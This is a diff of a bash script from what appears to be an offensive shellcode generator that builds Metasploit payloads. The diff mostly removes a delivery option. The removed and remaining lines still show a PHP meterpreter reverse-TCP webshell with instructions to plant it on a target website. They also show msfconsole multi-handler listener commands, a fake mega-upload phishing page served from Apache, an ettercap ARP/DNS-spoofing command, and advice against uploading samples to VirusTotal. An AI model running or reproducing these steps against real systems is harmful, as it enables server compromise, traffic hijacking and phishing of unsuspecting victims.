@@ -78,7 +78,6 @@ InJEc16="$IPATH/templates/exec.jar" # jar script path
 # -------------------------------------------
 ChEk=`cat settings | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1
 MsFu=`cat settings | egrep -m 1 "MSF_UPDATE" | cut -d '=' -f2` > /dev/null 2>&1
-RePoR=`cat settings | egrep -m 1 "MSF_REPORTS" | cut -d '=' -f2` > /dev/null 2>&1
 ApAcHe=`cat settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
 D0M4IN=`cat settings | egrep -m 1 "MEGAUPLOAD_DOMAIN" | cut -d '=' -f2` > /dev/null 2>&1
 DrIvC=`cat settings | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
@@ -3211,7 +3210,7 @@ cat << !
 +------------------
 | LPORT   : $lport
 | LHOST   : $lhost
-| FORMAT  : PHP - WEB SERVERS
+| FORMAT  : PHP - WEBSHELL
 |_PAYLOAD : php/meterpreter/reverse_tcp
 
 !
@@ -3239,7 +3238,7 @@ cd $IPATH/output
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" --width 370 --height 300) > /dev/null 2>&1
 
 
    if [ "$serv" = "multi-handler (default)" ]; then
@@ -3251,41 +3250,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 
    else
 
-      # edit files nedded
-      cd $IPATH/templates/phishing
-      cp $InJEc12 mega[bak].html
-      sed "s|NaM3|$N4m.php|g" mega.html > copy.html
-      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
-      # copy from output
-      cd $IPATH/output
-      cp $N4m.php $ApAcHe/$N4m.php > /dev/null 2>&1
-      echo "[☠] loading -> Apache2Server!"
-      echo "---"
-      echo "- SEND THE URL GENERATED TO TARGET HOST"
+     echo "[x] Abort ...."
+     sleep 2
 
-        if [ "$D0M4IN" = "YES" ]; then
-        # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
-        cp $IPATH/output/$N4m.php $ApAcHe/$N4m.php
-        echo "- ATTACK VECTOR: http://mega-upload.com"
-        echo "---"
-        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠] Start a multi-handler..."
-        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
-
-        else
-
-        echo "- ATTACK VECTOR: http://$lhost"
-        echo "---"
-        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠] Start a multi-handler..."
-        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
-
-        fi
    fi
 
 
@@ -3315,7 +3282,7 @@ cat << !
 +------------------
 | LPORT   : $lport
 | LHOST   : $lhost
-| FORMAT  : PHP -> WEB SERVERS
+| FORMAT  : PHP -> WEBSHELL
 |_PAYLOAD : php/meterpreter/reverse_tcp
 
 !
@@ -3371,7 +3338,7 @@ chmod +x $IPATH/output/$N4m.php > /dev/null 2>&1
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" --width 370 --height 300) > /dev/null 2>&1
 
 
    if [ "$serv" = "multi-handler (default)" ]; then
@@ -3384,42 +3351,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 
    else
 
+     echo "[x] Abort ...."
+     sleep 2
 
-      # edit files nedded
-      cd $IPATH/templates/phishing
-      cp $InJEc12 mega[bak].html
-      sed "s|NaM3|$N4m.php|g" mega.html > copy.html
-      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
-      # copy from output
-      cd $IPATH/output
-      cp $N4m.php $ApAcHe/$N4m.php > /dev/null 2>&1
-      echo "[☠] loading -> Apache2Server!"
-      echo "---"
-      echo "- SEND THE URL GENERATED TO TARGET HOST"
-
-        if [ "$D0M4IN" = "YES" ]; then
-        # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
-        cp $IPATH/output/$N4m.php $ApAcHe/$N4m.php
-        echo "- ATTACK VECTOR: http://mega-upload.com"
-        echo "---"
-        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠] Start a multi-handler..."
-        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
-
-        else
-
-        echo "- ATTACK VECTOR: http://$lhost"
-        echo "---"
-        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠] Start a multi-handler..."
-        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
-
-        fi
    fi
 
 
@@ -4544,7 +4478,7 @@ echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target system .." --radiolist --column "Pick" --column "Option" TRUE "WINDOWS" FALSE "MAC OSx" --width 305 --height 100) > /dev/null 2>&1
+Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target system .." --radiolist --column "Pick" --column "Option" TRUE "WINDOWS" FALSE "MAC OS x" --width 305 --height 100) > /dev/null 2>&1
 
 
   # config rigth arch (payload+format)
@@ -5090,12 +5024,6 @@ cd $IPATH/
 # exit venom framework
 # ------------------------------------
 sh_exit () {
-
-# STORING DATABASE CONTENTS
-if [ "$RePoR" = "ON" ]; then
-xterm -T " STORING DATABASE CONTENTS " -geometry 110x23 -e "msfconsole -x 'db_import -f xml $IPATH/output/report; exit -y'"
-fi
-
 echo "[☠] Exit Console -> Stoping Services..."
 sleep 1
 if [ "$DiStR0" = "Kali" ]; then
